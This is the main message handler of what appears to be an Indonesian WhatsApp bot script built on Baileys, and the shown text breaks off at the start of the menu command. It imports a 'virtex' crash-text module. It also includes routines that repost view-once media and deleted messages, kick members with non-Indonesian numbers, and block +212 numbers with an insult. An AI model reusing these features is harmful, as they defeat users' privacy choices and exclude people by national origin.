  /*
  SCRIPT BY : LANA DEV & Dittaz
  EROR?? CHAT GROUP : https://chat.whatsapp.com/JgJHpvM7K6UAYVlT2zQPFA
  Youtube : https://youtube.com/@maulanabot
  JANGAN DI HAPUS ASU
  JUAL SCRIPT?? NERAKA PALING BAWAH
*/
  

"use strict";
import {generateWAMessageFromContent} from "baileys"
import toMs from 'ms'
import chalk from 'chalk'
import fs from "fs"
import fse from 'fs-extra'
import moment from "moment-timezone"
import util from "util"
import { exec, spawn } from "child_process"
import axios from "axios"
import yts from "yt-search"
import speed from "performance-now"
import ms from "parse-ms"
import ytdl from 'ytdl-core'
import os from 'os'
import { performance } from 'perf_hooks'
import fetch from 'node-fetch'
import cheerio from  'cheerio'
import request from "request"
import { join, dirname } from 'path'
import path  from 'path'
import { delRequireCache } from 'delete-node-require-cache'
import * as logs from './logs.js'
import { createRequire } from 'module'
import { fileURLToPath, URL } from 'url'
const __dirname = dirname(fileURLToPath(import.meta.url))
var require = createRequire(import.meta.url) //Bring in the ability to create the 'require' method


//----------------- LIB FILE ------------------\\
import {formatp, getRandom,generateProfilePicture, getCase,runtime,FileSize,h2k, makeid,kyun,randomNomor,jsonformat, isUrl, fetchJson,pickRandom,getGroupAdmins, sleep,getBuffer} from "../lib/myfunc.js" 
import {TelegraPh} from '../lib/uploader.js'
import _data from "../lib/totalcmd.js"
import _sewa from '../lib/sewa.js'
import _prem from "../lib/premium.js"
import _scrape from '../lib/scraper.js'
import _error from "../lib/totalerror.js"
import _blockcmd from "../lib/blockcmd.js"
import _spam from '../lib/antispam.js'
import _ban from "../lib/banned.js"
//import mess from "./message.js" 
import {register} from "./register.js"




//------------------ VIRTEX FILE ------------------\\
//virtex by tsukasa
import { virtex8 } from './virtex.js'
const thumb = fs.readFileSync('./stik/thumb.jpeg')
var publik = true

//=================================================//
export const Fearless = async(conn, m, chatUpdate, store) => {
try {
	
//Database
const AntiSpam = db.data.antispam
const DataId = db.data.data
const ban = db.data.banned
const premium = db.data.premium
const listcmdblock = db.data.blockcmd 
const listerror = db.data.listerror
const hitnya = db.data.hittoday
const dash = db.data.dashboard 
const anonChat = db.data.anonymous 
const allcommand = db.data.allcommand 
const sewa = db.data.sewa
const spammer = []

//========================//

// SCRIPT BY : LANA DEV
// EROR?? WA : 085773089737
// JANGAN DI HAPUS ASU
// JUAL SCRIPT NERAKA PALING BAWAH

//===================//
  
var Ownerin ="6281775445373@s.whatsapp.net"
var ownerNumber = [`${nomerOwner}@s.whatsapp.net` ,`${nomerOwner2}@s.whatsapp.net`,`6281775445373@s.whatsapp.net`,`${conn.user.jid}`]
const Tnow = (new Date()/1000).toFixed(0)
const seli = Tnow - m.messageTimestamp.low
if (seli > Intervalmsg) return console.log((`Pesan ${Intervalmsg} detik yang lalu diabaikan agar tidak nyepam`))

const { type,args, reply,sender,ucapanWaktu,from,botNumber,senderNumber,groupName,groupId,groupMembers,groupDesc,groupOwner,pushname,itsMe,isGroup,mentionByTag,mentionByReply,users,budy,content,body } = m

const prefix = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : '.'
const isCmd = body.startsWith(prefix)
const isCommand = isCmd?body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() :""
const q = args.join(' ')
const timeWib = moment().tz('Asia/Jakarta').format('HH:mm:ss')
const isOwner = ownerNumber.includes(sender) || _data.checkDataId ("owner", sender, DataId) 
const command = isOwner? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCommand
const theOwner = sender == Ownerin 
const timestampp = speed();
const latensi = speed() - timestampp
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001) 
const numberQuery = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
const Input = mentionByTag[0]? mentionByTag[0] : mentionByReply ? mentionByReply : q? numberQuery : false 
const replyCommand = isCmd? isCmd : allcommand.includes(toFirstCase(command))
const selectedButton = (type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : ''
const user = global.db.data.users[m.sender] 
const settings = global.db.data.settings['settingbot']
//Import message.js
await (await import('./message.js')).default(prefix,command)
//Import allfake.js
await (await import('./allfake.js')).default(m)
  
//Register terlebih dahulu sebelom pakai bot
register(m,makeid,isCmd,isOwner)
  
const isImage = (type === 'imageMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isAudio = (type == 'audioMessage')
const isText = (type == 'conversation')
const isReaction = (type == 'reactionMessage')
const isMedia = (type === 'imageMessage' || type === 'videoMessage')
const isViewOnce = (type == 'viewOnceMessage')
const isAllMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessage')

//Security / Keamanan
const isBotGroupAdmins = isGroup ? m.isBotAdmin : false
const isGroupOwner = isGroup ? m.isRAdmin : false
const isGroupAdmins = isGroup ? m.isAdmin : false
const isAntiLink = isGroup ? db.data.chats[from].antilink : false
const isAntidelete = isGroup ? db.data.chats[from].antidelete : false
const isKickarea = isGroup ? db.data.chats[from].antiasing : false
const isAntilinkGc = isGroup ? db.data.chats[from].antilinkgc : false
const isBanchat = isGroup ? db.data.chats[from].banchat : false 
const isAntiVirtex = isGroup ? db.data.chats[from].antivirtex : false
const isAntihidetag = isGroup ? db.data.chats[from].antihidetag : false
const isAntiViewOnce = isGroup ? db.data.chats[from].viewonce : false
const isBanned = sender? _ban.check(senderNumber, ban) : false
const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium)
const gcount = isPremium ? gcounti.prem : gcounti.user
const updateGempa = isGroup ? db.data.chats[from].updateGempa : false
  
//User 
const userLevel = user? db.data.users[m.sender].level : false
const userExp = user? db.data.users[m.sender].exp : false
const userId = user? db.data.users[m.sender].id : false
const amountExp = Math.floor(Math.random() * 10) + 50
const requiredExp = 1000 * userLevel
const userPersen = userExp/requiredExp*100
const userVerified = user? db.data.users[m.sender].date : false

  
//Bot hanya merespon jika button miliknya saja yang di tekan 
if(m.myButton) {return}

//AUTO Read Message  
conn.readMessages([m.key])

//Presence Online
if (isCmd){
conn.sendPresenceUpdate('composing', from)
} else {
conn.sendPresenceUpdate('available', from)
}


//Public & Self And Banchat
if (!publik && !itsMe && !isOwner && !theOwner) {return} 
if (isGroup && isBanchat && !itsMe && !isOwner) {return}

//Console log
if(!isCmd && !isAllMedia && !isReaction && budy.length < 8000 && type !== 'protocolMessage') logs.message(conn,m,budy,AntiSpam)
if(isCmd) logs.commands(m,command) 


  
//Set Quoted
if(Qoted === "ftoko"){
var setQuoted = ftoko
} else if(Qoted === "fkontak"){
var setQuoted = fkontak
} else if(Qoted === "ftext"){
var setQuoted = ftext
}else if(Qoted === "ftroli"){
var setQuoted = ftroli
} else if(Qoted === "floc"){
var setQuoted = floc
} else if(Qoted === "fimage"){
var setQuoted = fimage
} else if(Qoted === "m"){
var setQuoted = m
} else if(Qoted === "fdoc"){
var setQuoted = fdoc
}
  //
const setReply = async(result,member = []) =>{ 
let translate = require('@vitalets/google-translate-api');
let data = global.db.data.others['runtime']
let time = (new Date - data.runtime) || "Tidak terdeteksi"
  
if (language == "id"){
  
if (!sender.startsWith("62")){
let toks =  translate(result, {to: "en",})
var teks = toks.text
} else {
var teks = result
}

} else {
let toks =  translate(result, {to: language,})
var teks = toks.text
} 

let contextInfo = {
forwardingScore: 999, 
isForwarded: false, 
mentionedJid: member,
externalAdReply:{
showAdAttribution: true, 
title: `LanaBotz V.3`,
body:`SOURCE CODE`,
previewType:"PHOTO",
thumbnail: fs.readFileSync('./stik/reply.jpg'),
sourceUrl:`https://replit.com/@Lanabot`
}
}

if(replyType === "web"){
conn.sendMessage(from, { contextInfo,mentions: member, text: `${teks}`}, { quoted: m })
} else if(replyType === "web2"){
conn.sendMessageV2(from, {contextInfo,mentions: member,text: teks},{quoted: m })
} else if(replyType === "mess"){
conn.sendMessage(from, {text: teks}, { quoted: m });
} else if(replyType === "quoted"){
conn.sendMessage(from,{ mentions: member,text: teks}, { quoted: setQuoted });
} else {
conn.sendMessage(from, {text: "Error SetReply Tidak Di Temukan"})
}
}
  //========================//

// SCRIPT BY : LANA DEV
// EROR?? WA : 085773089737
// JANGAN DI HAPUS ASU
// JUAL SCRIPT NERAKA PALING BAWAH

//===================//
/*
//SetReply
const setReply = async(result,member = []) =>{ 
let translate = require('@vitalets/google-translate-api');
let data = global.db.data.others['runtime']
let time = (new Date - data.runtime) || "Tidak terdeteksi"
  
if(language == "id"){
  
if(!sender.startsWith("62")){
let toks =  translate(result, {to: "en",})
var teks = toks.text
} else {
var teks = result
}

} else {
let toks =  translate(result, {to: language,})
var teks = toks.text
} 

  
let contextInfo = {
forwardingScore: 50, 
isForwarded: true, 
mentionedJid: member,
externalAdReply:{
showAdAttribution: false, 
title: `https://maulanabot.my.id`,
body:`Runtime ${clockString(time)} `,
previewType:"PHOTO",
thumbnail: fs.readFileSync('./stik/reply.jpg')}
}

if(replyType === "web"){
conn.sendMessage(from, { contextInfo,mentions: member, text: teks }, { quoted: m })
} else if(replyType === "web2"){
conn.sendMessageV2(from, {contextInfo,mentions: member,text: teks},{quoted: m })
} else if(replyType === "mess"){
conn.sendMessage(from, {text: teks}, { quoted: m });
} else if(replyType === "quoted"){
conn.sendMessage(from,{ mentions: member,text: teks}, { quoted: setQuoted });
} else {
conn.sendMessage(from, {text: "Error SetReply Tidak Di Temukan"})
}
}
 */

 
	
const math = (teks) => {
return Math.floor(teks)
}  
      


//onlyOwner
const onlyOwner = async() =>{
setReply(mess.only.ownerB)
}

  
//Bot tidak bisa di akses di pc kecuali premium



 //ANTI LINK GROUP
if (isGroup && isAntilinkGc && budy.includes(`chat.whatsapp.com`)) {
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
if(ownerNumber.includes(sender)) return setReply('Alah sia owner bot mah bebas yekan :v')
let linkgc = await conn.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
await setReply(` *「 LINK GROUP DETECTED 」*\nKamu mengirimkan link group, maaf kamu di kick dari grup :(`)
await sleep(3000)
if(isBotGroupAdmins) await conn.sendMessage(from, { delete: m.key })
await conn.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}   

  
 //ANTI LINK 
if (isGroup && isAntiLink){
if (budy.includes(`https:`)) { 
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
if(ownerNumber.includes(sender)) return setReply('Alah sia owner bot mah bebas yekan :v')
let linkgc = await conn.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
setReply(` *「 LINK DETECTED 」*\nKamu mengirimkan link, maaf kamu di kick dari grup :(`)
setTimeout(() => {
if(isBotGroupAdmins) conn.sendMessage(from, { delete: m.key })
conn.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}, 2000)
}
}

 //ANTI ASING
if (isGroup && isBotGroupAdmins &&isKickarea && !itsMe) {    
let member = await groupMembers.map(u => u.id)
for ( let i = 0; i <member.length; i++){  
if (member[i].slice(0,2) !== "62" ){     	
let usersId = await groupMembers.find(u => u.id == member[i]) 
if (!usersId.groupAdmins ){
await conn.groupParticipantsUpdate(from, [member[i]], 'remove')
await sleep(1000)
}
}
} 
}  

//ANTI VIRUS
if (isGroup && isAntiVirtex && budy.length > 20000) {
if (isGroupAdmins) return setReply('*VIRTEX DETECTED*')
const antivirus  = require('./antivirus.js')  
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
await conn.sendMessage(from, {text:antivirus(pushname,groupName)})
if (!isBotGroupAdmins) {return }
if(isOwner) {return}
await conn.groupParticipantsUpdate(from, [sender], 'remove')
await conn.sendMessage(`${nomerOwner}@s.whatsapp.net`,{text: `Hai Owner! wa.me/${sender.split("@")[0]} Terdeteksi Telah Mengirim Virtex ${isGroup?`di Group ${groupName}`:''}`})
}

  
//ANTI DELETE 
if(type == 'protocolMessage' && isAntidelete){
//Log(m.message.protocolMessage)
let mess = chatUpdate.messages[0].message.protocolMessage
let chats = Object.entries(await conn.chats).find(([user, data]) => data.messages && data.messages[mess.key.id])
if(chats[1] == undefined) return
if(chats[1] !== undefined){
let msg = JSON.parse(JSON.stringify(chats[1].messages[mess.key.id]))
await conn.copyNForward(mess.key.remoteJid, msg).catch(e => console.log(e, msg))
}
}


//ANTI VIEWONCE 
if ((type == 'viewOnceMessage' || isQuotedViewOnce) && (isAntiViewOnce || budy.startsWith("Readviewonce"))) {
const { downloadContentFromMessage } = (await import('baileys')).default
if(isQuotedViewOnce){
var view = m.quoted.message
} else {
var view = m.message.viewOnceMessage.message
} 

let Type = Object.keys(view)[0]
let media = await downloadContentFromMessage(view[Type], Type == 'imageMessage' ? 'image' : 'video')
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(Type)) {
conn.sendFile(m.chat, buffer, 'media.mp4', view[Type].caption || '', m)
} else if (/image/.test(Type)) {
conn.sendFile(m.chat, buffer, 'media.jpg', view[Type].caption || '', m)
}
}

  
  
//===================================================================//

//TOTAL FITUR BY OFFICIAL DITTAZ\\
const totalFitur = () =>{
var mytext = fs.readFileSync("./message/case.js").toString()
var numUpper = (mytext.match(/case/g) || []).length;
return numUpper
}    


const addSpammer = function(jid, _db){
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
_db[position].spam += 1
 } else {
let bulin = ({ id: jid, spam: 1 })
 _db.push(bulin)     
}
}

const FinisHim = async function(jid, _db){
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
if(_db[position].spam > 7){
if(db.data.users[sender].banned.status || !isOwner){return}
let obj = {
id: senderNumber,
status: true,
date: calender,
reason: "Spam Bot"
}
db.data.users[woke].banned = obj               
console.log(`${jid} Terdeteksi spam lebih dari ${_db[position].spam} kali`)
setReply("Kamu telah di banned karena telah melakukan spam")
}
} else {
console.log(`Spam ke ${_db[position].spam}`)
}
}

  
//ANTI SPAM BERAKHIR
if(_spam.Expired(senderNumber, "Case", AntiSpam)){
let position = false
for(let i of spammer){
if(i.id == senderNumber){
position = i
}
}
    
if (position !== false) {
spammer.splice(position, 1)
console.log(chalk.bgGreen(color("[  Remove ]", "black")),"Sukses remove spammer")
}
}

_spam.Expired(senderNumber, "NotCase", AntiSpam)
if(isBanned && !isOwner){return} //user terbanned
if(isCmd && _spam.check("Case",senderNumber, AntiSpam)){
addSpammer(senderNumber, spammer)
FinisHim(senderNumber, spammer)
return console.log(chalk.bgYellowBright(chalk.black("[  SPAM  ]")),"antispam Case aktif")
}

//ANTI SPAM PRIVATE CHAT
if(antiSpam && isCmd && _spam.isFiltered(from) && !isGroup && !itsMe && !isOwner){
_spam.add("Case",senderNumber, "15 s", AntiSpam)
addSpammer(senderNumber, spammer)
return setReply("Beri bot waktu jeda 5 detik")
}

//ANTI SPAM GROUP CHAT     
if (antiSpam && isCmd && _spam.isFiltered(from) && isGroup && !itsMe && !isOwner) {
_spam.add("Case",senderNumber, "15s", AntiSpam)
addSpammer(senderNumber, spammer)
return setReply("Beri bot waktu jeda 5 detik")
}
if (isCmd && !isOwner) _spam.addFilter(from)



//System Expired
_sewa.expiredCheck(conn, sewa)
_prem.expiredCheck(premium) 


//Make Sticker
async function makeSticker(media,Sticker, StickerTypes){
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await conn.sendMessage(from,{sticker: nah},{quoted: m})
await fs.unlinkSync(stok)
}

		
//DOWNLOAD MP4
const downloadMp4 = async (Link ) => {
try{
await ytdl.getInfo(Link);
let mp4File = getRandom('.mp4') 
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on("finish", async () => {    
await conn.sendMessage(from, { video: fs.readFileSync(mp4File), caption: "Nih!",gifPlayback: false},{quoted: m})
fs.unlinkSync(`./${mp4File}`)
})     
} catch(err) {
setReply(`${err}`)
}
}


//DOWNLOAD MP3
const downloadMp3 = async (Link ) => {
try{
await ytdl.getInfo(Link);
let mp3File = getRandom('.mp3') 
ytdl(Link, {filter: 'audioonly'})
.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {  
await conn.sendMessage(from, {audio:  fs.readFileSync(mp3File), mimetype: 'audio/mpeg' },{ quoted: m })
fs.unlinkSync(mp3File)
})       
} catch (err){
console.log(color(err))
}
} 

//AUTO BIO BOT 
if(settings){
} else global.db.data.settings['settingbot'] = { status: new Date() * 1, }
if ((new Date() * 1 - settings.status > 2000) && settings && settings.autoBio) {
const {kyun} = await import("../lib/myfunc.js")
let _uptime = process.uptime() 
let uptime = kyun(_uptime);
let bio = `${fake} 🤖 | ⏰ Runtime ${uptime}`
await conn.updateProfileStatus(bio).catch(_ => _)
settings.status = new Date() * 1
}

 

//AUTO DEL VIRTEX
if(m.virtex) {
if(isGroup && isBotGroupAdmins) conn.sendMessage(from, { delete: m.key})
if(!isGroup) conn.chatModify({ clear: { messages: [{ id: m.id, fromMe: sender == botNumber? true : false, timestamp: m.messageTimestamp }] } }, sender, [])
console.log(chalk.bgRedBright(chalk.black("[ VIRTEXT ]")),`Length: ${budy.length} from ${senderNumber} ${isGroup? `Group ${groupName}`: ""}`)
}
 

//AUTO BLOCK NOMER ASING +212
let nomerAsing = senderNumber.startsWith('+212')
if (nomerAsing) {
console.log(`Nomer asing dari ${senderNumber}`)
await m.reply("you are not allowed to using this bot")
if(!isGroup) await conn.sendMessage(from, {text: "stupid"},{quoted: lep})
return conn.updateBlockStatus(sender, "block") 
} 


//AUTO BLOCK CMD
for (let i = 0; i < listcmdblock.length ; i++) {
if (command === listcmdblock[i].cmd ){
if(autoblockcmd) {
return setReply(mess.block.Bsystem)
} else{
return setReply(mess.block.Bowner)
}
}
}

//FITUR USER PREMIUM
if(!_data.checkDataName("premium", "", DataId)) { 
await _data.createDataId("premium", DataId) 
}
let userPremium =  DataId.filter(item => item.name == "premium" )
for(let i of userPremium[0].id){
if(command == i && !isPremium) return setReply(`Kamu bukan user premium`)
}

//FITUR KHUSUS OWNER
if(!_data.checkDataName("commands", "", DataId)) { 
await _data.createDataId("commands", DataId)
}
let ownerCommands =  DataId.filter(item => item.name == "commands" )
for(let i of ownerCommands[0].id){
if(command == i && !isOwner) return onlyOwner()
} 

//FITUR USER LIMIT
if(!_data.checkDataName("limit", "", DataId)) { 
await _data.createDataId("limit", DataId) 
}
let userLimit =  DataId.filter(item => item.name == "limit" )
for(let i of userLimit[0].id){
if(!isOwner && command == i ){
if(!isPremium && db.data.users[sender].limit < 1) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if(!isPremium) {
db.data.users[sender].limit -= 1
conn.sendMessage(from,{text:`Limit kamu tersisa ${user.limit}`}, {quoted: m})
}
  
}
}

//USER AFK
if (user && user.afk > -1) {
setReply(`Kamu telah berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afk)}`.trim())
user.afk = -1
user.afkReason = ''
}
let jids = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of jids) {
let userAfk = global.db.data.users[jid]
if (!userAfk) continue
let afkTime = userAfk.afk
if (!afkTime || afkTime < 0) continue
let reason = userAfk.afkReason || ''
 setReply(`
Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
} 

//AUTO REACT
let regex =[ "bilek","banh","cum","kntl","anjing","mmk","bang","wibu","pantek","pepek","hentai"]
for (let i of regex){
if (!_spam.check("NotCase",senderNumber, AntiSpam) && isGroup && budy.toLowerCase().includes(i)){ 
_spam.add("NotCase",senderNumber, "10s", AntiSpam)
let emot = await pickRandom(["🗿", "👍", "🙄", "😝", "😏", "💩", "👻", "🔥", "🤣","🤬", "😎", "😂", "😘", "😑", "😱", "❤️", "🔥", "😳","😍","🤩","🥳","🤔","🤗","🤤","👎","👊","🙈","🤡"])
conn.sendMessage(from, { react: { text: emot, key: m.key } })	
}
}
/*
//AUTO RESPON SIMI VIA REPLY/TAG BOT
const isReplySticker = type === 'stickerMessage' && content.includes('stickerMessage')
const isQuotedReplySticker = type === 'stickerMessage' && content.includes('extendedTextMessage')
const mentionByReplySticker = type == "stickerMessage" && m.message.stickerMessage.contextInfo != null ? m.message.stickerMessage.contextInfo.participant || "" : ""
if (Input == botNumber && isGroup && !replyCommand && !isAudio || mentionByReplySticker == botNumber && isSticker && !replyCommand) {
try{	
await sleep(2000)
conn.sendPresenceUpdate('composing', from) 
if(isQuotedReplySticker || isReplySticker ){
await sleep(2000)
let namastc = await pickRandom(Object.keys(db.data.sticker))
conn.sendMessage(from, {sticker: {url:db.data.sticker[namastc].link}}, {quoted:m })
} else{
let jawab = ["Afa iyah 🗿","Oh","Aku ga ngerti om 🐦","Boong","🗿","🐦","Oh gitu 🐦"]        
let teks1 = pickRandom(jawab)
let teks2 = body
let hasil = [`${teks1}`,`${teks2}`]
let random = pickRandom(hasil)
  //console.log(idnya)
let kata = body.replace(`@${botNumber.split("@")[0]}`, "")
let kato = ["Kenapa ?","Ha ?","Napa tag gua ?","napa ?","ya ?","apa ?","Hmm ?"]
let acak = pickRandom(kato)
if(kata == "") return conn.sendMessage(from,{text: acak},{quoted: m})  
try{
let simi = await fetchJson(`hhttps://simsimi.info/api/?text=${body}&lc=id`, {methods: "GET"})
var sami = simi.success  
} catch{
let simi = await fetchJson(`https://simsimi.info/api/?text=${body}&lc=id`, {methods: "GET"})
var sami = simi.message  
}
 if(sami.startsWith("Aku tidak mengerti")){
var teksnya = random
} else {
var teksnya = sami
}
await sleep(2000)
conn.sendMessage(from,{text: teksnya},{quoted: m})  
//setReply(`${teksnya}`)
}
} catch (err){
console.log(err)
setReply("Aduh simi lagi error nih")
}
}
  */

//Auto Sticker Online
if(db.data.sticker[budy]){ 
if (_spam.check("NotCase",senderNumber, AntiSpam)) return
_spam.add("NotCase",senderNumber, "5s", AntiSpam)
conn.sendMessage(from,{sticker:{url:db.data.sticker[budy].link}})
}
//========================//

// SCRIPT BY : LANA DEV
// EROR?? WA : 085773089737
// JANGAN DI HAPUS ASU
// JUAL SCRIPT NERAKA PALING BAWAH

//===================//
//Auto VN Online  
if(db.data.audio[budy]) {
if (_spam.check("NotCase",senderNumber, AntiSpam)) return 
let nono =  {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${pushname} \n「 audio 」 ${db.data.audio[budy].name}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
const iniQuoted = mentionByReply? m.quoted.fakeObj : nono 
conn.sendMessage(from, {audio: {url: db.data.audio[budy].link},ptt: true, waveform:  [
0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  9,
35, 51, 67, 73, 73, 25, 18, 58, 75, 72, 26,  0,
27, 56, 58, 43, 12, 23, 35, 49, 62, 67, 63, 18,
2, 16, 39, 45, 43, 31, 21, 36, 57, 71, 70, 67,
23, 49, 36,  6, 17, 39, 50, 52, 45, 27, 26, 50,
51, 49, 49, 49
], mimetype: 'audio/mpeg'}, {quoted: iniQuoted }) 
_spam.add("NotCase",senderNumber, "5s", AntiSpam)
}



//Game Family 100
conn.family = conn.family ? conn.family : {}
if(isGroup && from in conn.family){
let similarity = require('similarity')
let threshold = 0.72 // semakin tinggi nilai, semakin mirip
let id =  m.chat
let room = conn.family[id]
let text = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurrender = /^((me)?nyerah|surr?ender)$/i.test(budy)
if (!isSurrender) {
let index = room.jawaban.indexOf(text)
if (index < 0) {
if (Math.max(...room.jawaban.filter((_, index) => !room.terjawab[index]).map(jawaban => similarity(jawaban,text))) >= threshold) return setReply('Dikit lagi!')
}
if (!isCmd && room.terjawab[index]) {return} 
room.terjawab[index] = m.sender
user.balance += room.winScore
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
*Soal:* ${room.soal}

Terdapat *${room.jawaban.length}* jawaban${room.jawaban.find(v => v.includes(' ')) ? `
(beberapa jawaban terdapat spasi)
`: ''}
${isWin ? `*SEMUA JAWABAN TERJAWAB*` : isSurrender ? '*MENYERAH!*' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
 return isSurrender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
 }).filter(v => v).join('\n')}

${isSurrender ? '' : `+${room.winScore} Money tiap jawaban benar`}
    `.trim()

setReply(caption, await conn.parseMention(caption)).then(msg => {
 conn.family[id].msg = msg
}).catch(_ => _)
if (isWin || isSurrender) delete conn.family[id] 

}


//GAME MATH FUNCTION
conn.math = conn.math ? conn.math : {}
if(isGroup && from in conn.math){
//console.log(conn.math)
try{
let id = from
if (!(id in conn.math) && /^apa hasil dari/i.test(budy)) return setReply('soal itu sudah berakhir')
let math = JSON.parse(JSON.stringify(conn.math[id][1]))
if (budy == math.result) {
user.balance += math.bonus
clearTimeout(conn.math[id][3])
delete conn.math[id]
await setReply(` benar\n\nSaldo: Rp${math.bonus}\n\nmath ${math.mode}`)
} else {    
if (--conn.math[id][2] == 0) {
clearTimeout(conn.math[id][3])
delete conn.math[id]
setReply(`*kesempatan habis!*\njawabannya adalah *${math.result}*`)
} else setReply(`*jawaban salah!*\nmasih ada ${conn.math[id][2]} kesempatan`)
}
}catch(err){
console.log(err)
}
}


//GAME Caklontong Function
conn.caklontong = conn.caklontong ? conn.caklontong : {}  
if(isGroup && from in conn.caklontong){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let json = JSON.parse(JSON.stringify(conn.caklontong[id][1]))
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
global.db.data.users[m.sender].exp += conn.caklontong[id][2]
let teks = `*GAME CAKLONTONG BERAKHIR*

Selamat jawaban kamu benar
Hadiah : Rp ${conn.caklontong[id][2]}
${json.desc}

Ingin bermain lagi? kirim ${prefix}tebakkata
atau tekan button di bawah ini`

let but = [{ buttonId: `${prefix}limit`, buttonText: { displayText: "Limit" }, type: 1 },{ buttonId: `${prefix}caklontong`, buttonText: { displayText: "Mainlagi" }, type: 1 } ]
conn.sendButMessage(from,teks,copyright,but,m)
clearTimeout(conn.caklontong[id][3])
delete conn.caklontong[id]
} else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
else if(conn.caklontong[id][2].jawaban.length < budy.length && !isCmd) {
setReply(`*Salah!*`)
} else if(!isCmd && budy.includes("nyerah")){
let text =`
Yahahaha malah nyerah

jawabanya itu adalah ${json.jawaban}
${json.desc}
`
setReply(text)
clearTimeout(conn.caklontong[id][3])
delete conn.caklontong[id]
}

}




//NEW ANTI SPAM
conn.spam = conn.spam ? conn.spam : {}
let chat = global.db.data.chats[m.chat]
if (chat && chat.antispam) {
if (m.sender in conn.spam) {
conn.spam[m.sender].count++
if (m.messageTimestamp.toNumber() - conn.spam[m.sender].lastspam > 10) {
if (conn.spam[m.sender].count > 10) {
//global.db.data.users[m.sender].banned = true
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? conn.user.jid : m.sender
let caption = `Kamu telah di banned *@${who.split("@")[0]}* karena melakukan spam, Jangan spam kak!`
setReply(caption,conn.parseMention(caption) )
  //conn.sendButton(m.chat, caption, wm, null, [['Matikan AntiSpam', '/disable antispam']], m, { mentions: conn.parseMention(caption) })
}
conn.spam[m.sender].count = 0
conn.spam[m.sender].lastspam = m.messageTimestamp.toNumber()
}
} else conn.spam[m.sender] = {
jid: m.sender,
count: 0,
lastspam: 0
}
}

  
  

//Auto Hit 
_data.expiredCmd(hitnya, dash)
const thisHit = `${_data.getHit("run", hitnya)}` 
if(isCmd){
db.data.users[sender].hit += 1
_data.cmdAdd("run", "1d", hitnya)
_data.Succes(toFirstCase(command), dash, allcommand)
}


//===================================//
  
try{
switch(command) {




case  'menu':{
const { allmenu, fitur} = (await import('./help.js'))
let menunya = allmenu(limitCount, isPremium,thisHit, publik, sender, prefix, pushname)
let fiturnya = fitur()
let mok = [
